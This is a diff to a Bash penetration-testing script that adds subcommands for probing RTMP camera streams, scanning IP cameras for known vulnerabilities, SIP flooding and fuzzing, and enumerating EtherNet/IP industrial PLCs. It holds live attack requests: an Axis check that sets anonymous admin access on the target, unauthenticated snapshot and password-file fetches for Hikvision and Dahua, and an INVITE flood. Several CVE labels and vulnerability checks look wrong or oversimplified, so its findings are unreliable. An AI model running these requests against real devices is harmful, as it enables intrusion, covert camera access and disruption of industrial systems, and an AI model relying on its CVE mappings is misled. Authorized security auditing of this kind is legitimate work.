@@ -1109,7 +1109,8 @@ _suggest_attacks() {
             44818|102)
                   suggestions+=("17|modbus|$target|Porta ICS/SCADA — audit Modbus/industrial protocol") ;;
             8000) suggestions+=("16|onvif|$target --port 8000|ONVIF/gSOAP esposto — brute force WS-Security, GetDeviceInfo") ;;
-            1935) suggestions+=("19|web|$target --port 1935 --scheme http|RTMP esposto — streaming media server") ;;
+            1935) suggestions+=("19|rtmp|$target --port 1935|RTMP esposto — probe stream DVR/NVR/telecamere") ;;
+            44818) suggestions+=("16|enip|$target|EtherNet/IP (44818) — PLC/ICS Allen-Bradley, Rockwell") ;;
             5683) suggestions+=("23|coap|$target|CoAP esposto — dispositivo IoT, risorse pubbliche") ;;
             3702) suggestions+=("24|wsd|$target|WS-Discovery (3702) — device fingerprint telecamere/stampanti") ;;
             47808) suggestions+=("17|bacnet|$target|BACnet/IP (47808) — building automation, lettura oggetti") ;;
@@ -4018,6 +4019,510 @@ PYEOF
         $NMAP_TIMING $target 2>/dev/null" "$bacnet_tcp"
 
     ok "BACnet audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: rtmp
+# ============================================================
+usage_rtmp() {
+    echo "Uso: exa-dune rtmp <TARGET> [OPTIONS]"
+    echo ""
+    echo "  RTMP stream probing — DVR, telecamere IP, media server (porta 1935)."
+    echo "  Enumera app/stream, verifica accesso anonimo, cattura metadati."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta RTMP (default: 1935)"
+    echo "  --apps LIST      App da provare (default: embedded list)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_rtmp() {
+    local target="" port=1935 custom_apps=""
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)      port="$2";         shift 2 ;;
+            --apps)      custom_apps="$2";  shift 2 ;;
+            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --stealth)   STEALTH=1;         shift ;;
+            --dry-run)   DRY_RUN=1;         shift ;;
+            --help|-h)   usage_rtmp; exit 0 ;;
+            -*)          err "Opzione sconosciuta: $1"; usage_rtmp; exit 1 ;;
+            *)           target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_rtmp; exit 1; }
+    check_root
+    setup_outdir "$target" "rtmp"
+    log "Target: $target:$port | Output: $OUTDIR"
+
+    # Wordlist app/stream RTMP comuni (DVR, NVR, telecamere IP)
+    local _rtmp_apps
+    if [[ -n "$custom_apps" && -f "$custom_apps" ]]; then
+        _rtmp_apps="$custom_apps"
+    else
+        local _rtmp_tmp; _rtmp_tmp=$(mktemp)
+        cat > "$_rtmp_tmp" <<'WL'
+live
+stream
+live/stream
+hls
+rtmp
+video
+cam
+camera
+cam0
+cam1
+live/cam
+dvr
+nvr
+record
+ch1
+ch2
+channel1
+channel2
+bcs/channel0_main.bcs
+bcs/channel0_sub.bcs
+WL
+        _rtmp_apps="$_rtmp_tmp"
+    fi
+
+    # ── nmap RTMP port check ──────────────────────────────────
+    section "RTMP Port Scan"
+    local nmap_rtmp="$OUTDIR/nmap_rtmp.txt"
+    run_cmd "nmap -p $port -sV $NMAP_TIMING $target 2>/dev/null" "$nmap_rtmp"
+    if grep -qE "$port/tcp.*open" "$nmap_rtmp" 2>/dev/null; then
+        finding "MEDIUM" "RTMP" "RTMP porta $port aperta su $target"
+    fi
+
+    # ── ffprobe RTMP metadata probe ───────────────────────────
+    section "RTMP Metadata Probe (ffprobe)"
+    local ffprobe_out="$OUTDIR/rtmp_meta.txt"
+    if command -v ffprobe &>/dev/null; then
+        local _found_rtmp=0
+        while IFS= read -r app; do
+            [[ -z "$app" || "$app" == "#"* ]] && continue
+            local rtmp_url="rtmp://${target}:${port}/${app}"
+            if [[ $DRY_RUN -eq 1 ]]; then
+                echo -e "${CYAN}[DRY-RUN]${NC} ffprobe $rtmp_url" 
+                continue
+            fi
+            local meta
+            meta=$(timeout 8 ffprobe -v quiet -print_format json \
+                -show_streams "$rtmp_url" 2>/dev/null || true)
+            if [[ -n "$meta" && "$meta" != *'"streams": []'* ]]; then
+                echo "[FOUND] $rtmp_url" 
+                echo "$meta" >> "$ffprobe_out"
+                finding "HIGH" "RTMP" "Stream RTMP accessibile senza auth: $rtmp_url"
+                _found_rtmp=1
+            fi
+        done < "$_rtmp_apps"
+        [[ $_found_rtmp -eq 0 && $DRY_RUN -eq 0 ]] && log "Nessun stream RTMP accessibile"
+    else
+        warn "ffprobe non trovato — installa: apt install ffmpeg"
+    fi
+
+    # ── rtmpdump handshake probe ──────────────────────────────
+    section "RTMP Handshake / Server Info (rtmpdump)"
+    local rtmpdump_out="$OUTDIR/rtmpdump_probe.txt"
+    if command -v rtmpdump &>/dev/null; then
+        if [[ $DRY_RUN -eq 1 ]]; then
+            echo -e "${CYAN}[DRY-RUN]${NC} rtmpdump -r rtmp://${target}:${port}/live --stop 1" 
+        else
+            # Solo handshake — stop subito dopo
+            timeout 10 rtmpdump -r "rtmp://${target}:${port}/live" \
+                --stop 1 -o /dev/null 2>&1 | head -20 | tee "$rtmpdump_out" || true
+            if grep -qi "connected\|rtmp\|server" "$rtmpdump_out" 2>/dev/null; then
+                finding "MEDIUM" "RTMP" "Server RTMP risponde: $(head -2 "$rtmpdump_out")"
+            fi
+        fi
+    else
+        warn "rtmpdump non trovato — installa: apt install rtmpdump"
+    fi
+
+    [[ -n "$_rtmp_tmp" ]] && rm -f "$_rtmp_tmp" 2>/dev/null || true
+    ok "RTMP audit completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: cam-cve
+# ============================================================
+usage_camcve() {
+    echo "Uso: exa-dune cam-cve <TARGET> [OPTIONS]"
+    echo ""
+    echo "  Camera CVE Scanner — verifica vulnerabilità note su telecamere IP."
+    echo "  Supporta: Hikvision, Dahua, Axis, Reolink, Uniview, Foscam."
+    echo ""
+    echo "Opzioni:"
+    echo "  --vendor VENDOR  hikvision|dahua|axis|reolink|generic (default: auto)"
+    echo "  --port PORT      HTTP port (default: 80)"
+    echo "  --ssl            Usa HTTPS (443)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_camcve() {
+    local target="" vendor="auto" port=80 use_ssl=0
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --vendor)    vendor="$2";       shift 2 ;;
+            --port)      port="$2";         shift 2 ;;
+            --ssl)       use_ssl=1;         shift ;;
+            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --stealth)   STEALTH=1;         shift ;;
+            --dry-run)   DRY_RUN=1;         shift ;;
+            --help|-h)   usage_camcve; exit 0 ;;
+            -*)          err "Opzione sconosciuta: $1"; usage_camcve; exit 1 ;;
+            *)           target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_camcve; exit 1; }
+    check_root
+    setup_outdir "$target" "cam_cve"
+    local scheme="http"; [[ $use_ssl -eq 1 ]] && { scheme="https"; port=443; }
+    local base_url="${scheme}://${target}:${port}"
+    local curl_opts="-s --max-time 8 -k"
+    log "Target: $base_url | Vendor: $vendor | Output: $OUTDIR"
+
+    # ── Auto-detect vendor da header/banner ──────────────────
+    section "Camera Vendor Detection"
+    local detect_out="$OUTDIR/cam_detect.txt"
+    if [[ $DRY_RUN -eq 0 ]]; then
+        local headers; headers=$(curl $curl_opts -I "$base_url/" 2>/dev/null || true)
+        echo "$headers" > "$detect_out"
+        if [[ "$vendor" == "auto" ]]; then
+            echo "$headers" | grep -qi "hikvision\|dvr\|ipc\|hik" && vendor="hikvision"
+            echo "$headers" | grep -qi "dahua\|dh-" && vendor="dahua"
+            echo "$headers" | grep -qi "axis\|vapix" && vendor="axis"
+            echo "$headers" | grep -qi "reolink" && vendor="reolink"
+            echo "$headers" | grep -qi "uniview\|univideo" && vendor="uniview"
+            [[ "$vendor" == "auto" ]] && vendor="generic"
+            ok "Vendor rilevato: $vendor"
+        fi
+    fi
+
+    # ── CVE checks per vendor ─────────────────────────────────
+    section "CVE Checks — $vendor"
+    local cve_out="$OUTDIR/cam_cve_results.txt"
+
+    _cam_check() {
+        local cve="$1" desc="$2" url="$3" pattern="$4" severity="${5:-HIGH}"
+        if [[ $DRY_RUN -eq 1 ]]; then
+            echo -e "${CYAN}[DRY-RUN]${NC} $cve — $desc — GET $url"
+            return
+        fi
+        local resp; resp=$(curl $curl_opts "$url" 2>/dev/null || true)
+        if [[ -n "$pattern" ]]; then
+            if echo "$resp" | grep -qi "$pattern"; then
+                finding "$severity" "CAM-CVE" "$cve VULNERABLE: $desc ($url)"
+                echo "[VULN] $cve $desc" | tee -a "$cve_out"
+                echo "$resp" | head -5 >> "$cve_out"
+            else
+                echo "[SAFE] $cve $desc" >> "$cve_out"
+                log "  $cve: non vulnerabile"
+            fi
+        else
+            local code; code=$(curl $curl_opts -o /dev/null -w "%{http_code}" "$url" 2>/dev/null || echo 000)
+            if [[ "$code" == "200" ]]; then
+                finding "$severity" "CAM-CVE" "$cve POSSIBLMENTE VULNERABILE ($code): $desc"
+                echo "[WARN] $cve $code $desc" | tee -a "$cve_out"
+            else
+                echo "[SAFE] $cve HTTP $code $desc" >> "$cve_out"
+            fi
+        fi
+    }
+
+    case "$vendor" in
+        hikvision)
+            # CVE-2021-36260: Command injection via /SDK/webLanguage (unauthenticated)
+            _cam_check "CVE-2021-36260" "Hikvision unauthenticated RCE via webLanguage" \
+                "$base_url/SDK/webLanguage" "root\|passwd\|/bin" "CRITICAL"
+            # CVE-2017-7921: Unauthenticated snapshot bypass
+            _cam_check "CVE-2017-7921" "Hikvision unauthenticated snapshot bypass" \
+                "$base_url/onvif-http/snapshot?auth=YWRtaW46MTEM" "JFIF\|Content-Type.*image" "HIGH"
+            # CVE-2014-4880: Default credentials page exposure
+            _cam_check "CVE-2014-4880" "Hikvision default credentials login page" \
+                "$base_url/ISAPI/Security/userCheck" "statusValue\|200\|OK" "MEDIUM"
+            # Information disclosure: device info without auth
+            _cam_check "INFO-DISC" "Hikvision device info unauthenticated" \
+                "$base_url/ISAPI/System/deviceInfo" "deviceName\|firmwareVersion" "HIGH"
+            ;;
+        dahua)
+            # CVE-2021-33044: Authentication bypass via specific URI
+            _cam_check "CVE-2021-33044" "Dahua auth bypass via magic packet" \
+                "$base_url/cgi-bin/global.login?username=admin&ipAddr=0.0.0.0&clientType=Web3.0" \
+                "session\|success\|token" "CRITICAL"
+            # CVE-2017-7925: Unauthenticated config download
+            _cam_check "CVE-2017-7925" "Dahua unauthenticated config dump" \
+                "$base_url/current_config/passwd" "admin\|root\|password" "CRITICAL"
+            # Default config exposure
+            _cam_check "INFO-DISC" "Dahua device type unauthenticated" \
+                "$base_url/cgi-bin/magicBox.cgi?action=getDeviceType" "DeviceType" "HIGH"
+            ;;
+        axis)
+            # CVE-2018-10660: Axis root shell via parameter injection
+            _cam_check "CVE-2018-10660" "Axis unauthenticated root shell via VAPIX" \
+                "$base_url/axis-cgi/admin/param.cgi?action=update&root.Users.Admin.AuthAnonymous=yes" \
+                "200\|OK" "CRITICAL"
+            # VAPIX unauthenticated access
+            _cam_check "CVE-2016-6201" "Axis VAPIX auth bypass — snapshot" \
+                "$base_url/axis-cgi/jpg/image.cgi" "JFIF\|Content-Type.*image" "HIGH"
+            # Info disclosure
+            _cam_check "INFO-DISC" "Axis device info unauthenticated" \
+                "$base_url/axis-cgi/param.cgi?action=list&group=root.Brand" "Brand\|ProdFullName" "MEDIUM"
+            ;;
+        reolink)
+            # Reolink RTSP credential in URL (firmware artifact)
+            _cam_check "INFO-DISC-RTSP" "Reolink RTSP credential in URL pattern" \
+                "$base_url/cgi-bin/api.cgi?cmd=GetRtspUrl" "password\|rtsp\|credential" "HIGH"
+            # Reolink API without token
+            _cam_check "INFO-DISC-API" "Reolink API device info no-auth" \
+                "$base_url/cgi-bin/api.cgi?cmd=GetDevInfo&channel=0&rs=xxxx&user=admin&password=" \
+                "DevInfo\|firmVer\|name" "MEDIUM"
+            # CGI exec endpoint
+            _cam_check "INFO-DISC-CGI" "Reolink exec.cgi unauthenticated access" \
+                "$base_url/cgi-bin/api.cgi?cmd=Logout&rs=xxxx" "value\|code" "LOW"
+            ;;
+        generic|*)
+            # Generic camera checks (work across multiple vendors)
+            _cam_check "GENERIC-SNAPSHOT" "Unauthenticated snapshot" \
+                "$base_url/cgi-bin/snapshot.cgi" "JFIF\|Content-Type.*image" "HIGH"
+            _cam_check "GENERIC-CONFIG" "Config backup unauthenticated" \
+                "$base_url/cgi-bin/config.cgi" "admin\|password\|ssid" "HIGH"
+            _cam_check "GENERIC-RTSP" "RTSP credential in web response" \
+                "$base_url/cgi-bin/hi3510/param.cgi?cmd=getrtspurl" "rtsp\|password" "HIGH"
+            _cam_check "GENERIC-EXEC" "Exec CGI endpoint" \
+                "$base_url/cgi-bin/exec.cgi" "" "MEDIUM"
+            _cam_check "GENERIC-DEBUG" "Debug endpoint exposed" \
+                "$base_url/cgi-bin/debug.cgi" "" "MEDIUM"
+            _cam_check "ONVIF-INFO" "ONVIF device info unauthenticated" \
+                "$base_url:8000" "onvif\|soap\|device" "MEDIUM"
+            ;;
+    esac
+
+    ok "Camera CVE scan completato → $OUTDIR (vendor: $vendor)"
+}
+
+# ============================================================
+#  SUBCOMMAND: sip-fuzz
+# ============================================================
+usage_sipfuzz() {
+    echo "Uso: exa-dune sip-fuzz <TARGET> [OPTIONS]"
+    echo ""
+    echo "  SIP Fuzzing — invia messaggi SIP malformati e stress test."
+    echo "  Usa sipsak per OPTIONS flood, header fuzzing, tracerouting SIP."
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta SIP (default: 5060)"
+    echo "  --method M       Metodo SIP: OPTIONS|INVITE|REGISTER (default: OPTIONS)"
+    echo "  --count N        Numero di messaggi (default: 50)"
+    echo "  --sleep MS       Delay tra messaggi in ms (default: 100)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_sipfuzz() {
+    local target="" port=5060 method="OPTIONS" count=50 sleep_ms=100
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)      port="$2";      shift 2 ;;
+            --method)    method="$2";    shift 2 ;;
+            --count)     count="$2";     shift 2 ;;
+            --sleep)     sleep_ms="$2";  shift 2 ;;
+            --output)    OUTDIR_BASE="$2"; shift 2 ;;
+            --stealth)   STEALTH=1;      shift ;;
+            --dry-run)   DRY_RUN=1;      shift ;;
+            --help|-h)   usage_sipfuzz; exit 0 ;;
+            -*)          err "Opzione sconosciuta: $1"; usage_sipfuzz; exit 1 ;;
+            *)           target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_sipfuzz; exit 1; }
+    check_root
+    setup_outdir "$target" "sip_fuzz"
+    log "Target: $target:$port | Metodo: $method | Output: $OUTDIR"
+
+    # ── sipsak: SIP Swiss Army Knife ─────────────────────────
+    section "SIP $method Probe (sipsak)"
+    local sipsak_out="$OUTDIR/sipsak_probe.txt"
+    if command -v sipsak &>/dev/null; then
+        # Single OPTIONS probe con verbose
+        run_cmd "sipsak -v -s sip:probe@${target}:${port} 2>&1" "$sipsak_out"
+        if [[ -s "$sipsak_out" ]]; then
+            # Server banner e Allow
+            local server_hdr; server_hdr=$(grep -i "^Server:" "$sipsak_out" 2>/dev/null | head -1 || true)
+            local allow_hdr; allow_hdr=$(grep -i "^Allow:" "$sipsak_out" 2>/dev/null | head -1 || true)
+            [[ -n "$server_hdr" ]] && finding "INFO" "SIP-FUZZ" "Server: $server_hdr"
+            [[ -n "$allow_hdr" ]] && finding "INFO" "SIP-FUZZ" "Metodi SIP permessi: $allow_hdr"
+            if grep -q "200\|OK" "$sipsak_out" 2>/dev/null; then
+                finding "MEDIUM" "SIP-FUZZ" "Server SIP risponde a $method senza auth"
+            fi
+        fi
+    else
+        warn "sipsak non trovato — installa: apt install sipsak"
+    fi
+
+    # ── sipsak: SIP Trace/Traceroute ─────────────────────────
+    section "SIP Trace (sipsak -T)"
+    local trace_out="$OUTDIR/sipsak_trace.txt"
+    if command -v sipsak &>/dev/null && [[ $DRY_RUN -eq 0 ]]; then
+        timeout 20 sipsak -T -s "sip:trace@${target}:${port}" 2>&1 | tee "$trace_out" || true
+        if grep -qi "hop\|Via\|200\|486" "$trace_out" 2>/dev/null; then
+            finding "INFO" "SIP-FUZZ" "SIP trace: $(wc -l < "$trace_out") hop(s) rilevati"
+        fi
+    elif [[ $DRY_RUN -eq 1 ]]; then
+        echo -e "${CYAN}[DRY-RUN]${NC} sipsak -T -s sip:trace@${target}:${port}" 
+    fi
+
+    # ── sipsak: INVITE flood (stress test) ───────────────────
+    if [[ "$method" == "INVITE" ]]; then
+        section "SIP INVITE Stress Test"
+        local flood_out="$OUTDIR/sipsak_flood.txt"
+        if command -v sipsak &>/dev/null; then
+            run_cmd "sipsak -f $count -s sip:stress@${target}:${port} 2>&1" "$flood_out"
+            if grep -qi "flood\|request sent\|reply" "$flood_out" 2>/dev/null; then
+                finding "HIGH" "SIP-FUZZ" "INVITE stress test: server $target risponde — possibile DoS"
+            fi
+        fi
+    fi
+
+    # ── SIP nmap fuzzer NSE ───────────────────────────────────
+    section "SIP Header Analysis (nmap sip-methods)"
+    local nmap_sip="$OUTDIR/nmap_sip_methods.txt"
+    run_cmd "nmap -sU -p $port --script sip-methods,sip-enum-users \
+        $NMAP_TIMING $target 2>/dev/null" "$nmap_sip"
+    if [[ -s "$nmap_sip" ]]; then
+        while IFS= read -r line; do
+            echo "$line" | grep -qE "^\|.*Method|^\|.*Extension" || continue
+            finding "INFO" "SIP-FUZZ" "$line"
+        done < "$nmap_sip"
+    fi
+
+    ok "SIP fuzzing completato → $OUTDIR"
+}
+
+# ============================================================
+#  SUBCOMMAND: enip
+# ============================================================
+usage_enip() {
+    echo "Uso: exa-dune enip <TARGET> [OPTIONS]"
+    echo ""
+    echo "  EtherNet/IP — Common Industrial Protocol (CIP) su TCP/UDP 44818."
+    echo "  Enumera controller PLC, Identity, I/O modules (Allen-Bradley, Rockwell, ecc.)"
+    echo ""
+    echo "Opzioni:"
+    echo "  --port PORT      Porta EtherNet/IP (default: 44818)"
+    echo "  --output DIR"
+    echo "  --dry-run"
+}
+
+cmd_enip() {
+    local target="" port=44818
+    while [[ $# -gt 0 ]]; do
+        case "$1" in
+            --port)      port="$2";         shift 2 ;;
+            --output)    OUTDIR_BASE="$2";  shift 2 ;;
+            --stealth)   STEALTH=1;         shift ;;
+            --dry-run)   DRY_RUN=1;         shift ;;
+            --help|-h)   usage_enip; exit 0 ;;
+            -*)          err "Opzione sconosciuta: $1"; usage_enip; exit 1 ;;
+            *)           target="$1"; shift ;;
+        esac
+    done
+    [[ -z "$target" ]] && { err "TARGET mancante"; usage_enip; exit 1; }
+    check_root
+    setup_outdir "$target" "enip"
+    log "Target: $target:$port | Output: $OUTDIR"
+
+    # ── nmap EtherNet/IP NSE scripts ─────────────────────────
+    section "EtherNet/IP — nmap enip-info"
+    local nmap_enip="$OUTDIR/nmap_enip.txt"
+    run_cmd "nmap -p $port -sV --script enip-info \
+        -oN $OUTDIR/nmap_enip.txt $NMAP_TIMING $target 2>/dev/null" "$nmap_enip"
+    if [[ -s "$nmap_enip" ]]; then
+        while IFS= read -r line; do
+            echo "$line" | grep -qE "^\|.*(Product|Vendor|Serial|Revision|Identity)" || continue
+            finding "HIGH" "EtherNet/IP" "$line"
+        done < "$nmap_enip"
+        grep -qE "$port/tcp.*open" "$nmap_enip" 2>/dev/null && \
+            finding "HIGH" "EtherNet/IP" "EtherNet/IP porta $port aperta — PLC/ICS esposto"
+    fi
+
+    # ── UDP CIP List Identity broadcast ──────────────────────
+    section "CIP List Identity (UDP broadcast)"
+    local cip_out="$OUTDIR/cip_list_identity.txt"
+    if [[ $DRY_RUN -eq 1 ]]; then
+        echo -e "${CYAN}[DRY-RUN]${NC} CIP List Identity broadcast su $target:$port" 
+    else
+        python3 - <<PYEOF > "$cip_out" 2>&1 || true
+import socket, struct, time
+
+ENIP_PORT = $port
+# EtherNet/IP ListIdentity request
+LIST_IDENTITY = bytes([
+    0x65, 0x00,  # Command: ListIdentity (0x0065)
+    0x00, 0x00,  # Length: 0
+    0x00, 0x00, 0x00, 0x00,  # Session Handle
+    0x00, 0x00, 0x00, 0x00,  # Status
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # Sender Context
+    0x00, 0x00, 0x00, 0x00   # Options
+])
+try:
+    # UDP broadcast
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
+    s.settimeout(5)
+    s.sendto(LIST_IDENTITY, ("$target", ENIP_PORT))
+    s.sendto(LIST_IDENTITY, ("255.255.255.255", ENIP_PORT))
+    print(f"[EtherNet/IP] ListIdentity broadcast inviato a {ENIP_PORT}/UDP")
+    deadline = time.time() + 5
+    while time.time() < deadline:
+        try:
+            data, addr = s.recvfrom(1024)
+            print(f"[EtherNet/IP] Risposta da {addr[0]}: {data.hex()}")
+            # Parse Identity Response
+            if len(data) >= 28:
+                vendor_id  = struct.unpack_from('<H', data, 28)[0] if len(data) > 30 else 0
+                device_type = struct.unpack_from('<H', data, 30)[0] if len(data) > 32 else 0
+                print(f"  Vendor ID:   {vendor_id:#06x}")
+                print(f"  Device Type: {device_type:#06x}")
+        except socket.timeout:
+            break
+        except: break
+    s.close()
+    # TCP ListServices
+    try:
+        ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ts.settimeout(5)
+        ts.connect(("$target", ENIP_PORT))
+        ts.send(LIST_IDENTITY)
+        resp = ts.recv(1024)
+        if resp:
+            print(f"[EtherNet/IP] TCP risposta ({len(resp)} bytes): {resp[:64].hex()}")
+        ts.close()
+    except Exception as e:
+        print(f"[EtherNet/IP] TCP: {e}")
+except Exception as e:
+    print(f"[EtherNet/IP] Errore: {e}")
+PYEOF
+        if grep -q "EtherNet/IP.*Risposta" "$cip_out" 2>/dev/null; then
+            while IFS= read -r line; do
+                echo "$line" | grep -q "Risposta" && finding "HIGH" "EtherNet/IP" "Dispositivo CIP risponde: $line"
+            done < "$cip_out"
+        else
+            log "Nessuna risposta EtherNet/IP (dispositivo non presente o filtrato)"
+        fi
+    fi
+
+    # ── nmap UDP EtherNet/IP ──────────────────────────────────
+    section "EtherNet/IP UDP Scan"
+    local nmap_enip_udp="$OUTDIR/nmap_enip_udp.txt"
+    run_cmd "nmap -sU -p $port --script enip-info \
+        $NMAP_TIMING $target 2>/dev/null" "$nmap_enip_udp"
+    [[ -s "$nmap_enip_udp" ]] && grep -qE "^\|" "$nmap_enip_udp" && \
+        finding "HIGH" "EtherNet/IP" "EtherNet/IP UDP: $(grep '^\|' "$nmap_enip_udp" | head -1)"
+
+    ok "EtherNet/IP audit completato → $OUTDIR"
 }
 
 # ============================================================
@@ -7596,6 +8101,10 @@ cmd_help() {
         mdns)    banner; usage_mdns   ;;
         wsd)     banner; usage_wsd    ;;
         bacnet)  banner; usage_bacnet ;;
+        rtmp)    banner; usage_rtmp   ;;
+        cam-cve) banner; usage_camcve ;;
+        sip-fuzz) banner; usage_sipfuzz ;;
+        enip)    banner; usage_enip   ;;
         vnc)     banner; usage_vnc    ;;
         rdp)     banner; usage_rdp    ;;
         ldap)    banner; usage_ldap   ;;
@@ -7636,6 +8145,10 @@ cmd_help() {
             printf "  %-10s %s\n" "mdns"    "mDNS/Bonjour service discovery  (avahi-browse, nmap dns-sd)"
             printf "  %-10s %s\n" "wsd"     "WS-Discovery/SSDP devices  (UDP 3702 multicast, SSDP 1900)"
             printf "  %-10s %s\n" "bacnet"  "BACnet/IP building automation  (nmap bacnet-info NSE, Who-Is)"
+            printf "  %-10s %s\n" "rtmp"    "RTMP stream probe          (ffprobe, rtmpdump — DVR/NVR)"
+            printf "  %-10s %s\n" "cam-cve" "Camera CVE scanner         (Hikvision/Dahua/Axis/Reolink CVEs)"
+            printf "  %-10s %s\n" "sip-fuzz" "SIP fuzzing + stress test  (sipsak, nmap sip-methods)"
+            printf "  %-10s %s\n" "enip"    "EtherNet/IP CIP PLC audit  (nmap enip-info NSE, ListIdentity)"
             printf "  %-10s %s\n" "vnc"     "VNC audit                  (nmap vnc NSE, hydra)"
             printf "  %-10s %s\n" "rdp"     "RDP audit + brute force    (nmap rdp NSE, hydra)"
             printf "  %-10s %s\n" "ldap"    "LDAP enumeration           (ldapsearch, nmap ldap NSE)"
@@ -7734,6 +8247,9 @@ cmd_install() {
         "testssl:testssl.sh"
         "svmap:sipvicious"
         "nuclei:nuclei"
+        "sipsak:sipsak"
+        "rtmpdump:rtmpdump"
+        "avahi-browse:avahi-utils"
     )
 
     # ── Pacchetti pip3 (fallback se apt non disponibile) ──────────────────────
@@ -8063,6 +8579,10 @@ case "$subcommand" in
     mdns)    cmd_mdns    "$@" ;;
     wsd)     cmd_wsd     "$@" ;;
     bacnet)  cmd_bacnet  "$@" ;;
+    rtmp)    cmd_rtmp    "$@" ;;
+    cam-cve) cmd_camcve  "$@" ;;
+    sip-fuzz) cmd_sipfuzz "$@" ;;
+    enip)    cmd_enip    "$@" ;;
     vnc)     cmd_vnc     "$@" ;;
     rdp)     cmd_rdp     "$@" ;;
     ldap)    cmd_ldap    "$@" ;;
